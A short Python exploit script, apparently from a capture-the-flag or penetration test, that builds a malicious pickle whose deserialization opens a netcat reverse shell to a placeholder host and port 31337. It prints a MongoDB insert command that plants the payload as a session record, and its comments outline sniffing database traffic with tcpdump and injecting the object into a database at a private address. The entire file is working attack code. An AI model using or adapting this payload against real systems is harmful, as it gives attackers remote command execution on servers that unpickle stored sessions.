import pickle
import base64
import os
import random
import string


HOST, PORT = 'MY HOST', 31337
SESSION = '99999971-1f56-4708-a4aa-2eceb3dcbdd3'

def get_random_string(n):
	return ''.join(random.choice(string.digits) for i in range(n))

class RCE:
	def __reduce__(self):
		cmd = (f'rm /tmp/shell; mknod /tmp/shell p; nc {HOST} {PORT} 0</tmp/shell | /bin/sh 1>/tmp/shell')
		return os.system, (cmd,)

pickled = base64.b64encode(pickle.dumps(RCE())).decode()

print(f'''db.sessions.insert_one({{"_id":"{get_random_string(8)}", "id" : "session:{SESSION}", "val" : b64decode('{pickled}') , 'expiration': datetime.datetime(3000, 1, 1, 1)}})''')

# 1. sniff what whill be the MongoDB packet 
# sudo tcpdump -i any -s0 -w out.cap

# 2. use printed line after the following code to insert object into the DB 
# import pymongo 
# client = pymongo.MongoClient("10.29.24.98", 27017) 
# db = client.admin 

# 3. copy packet as HEX stream and use it on the next step (sniffed_hex_stream)
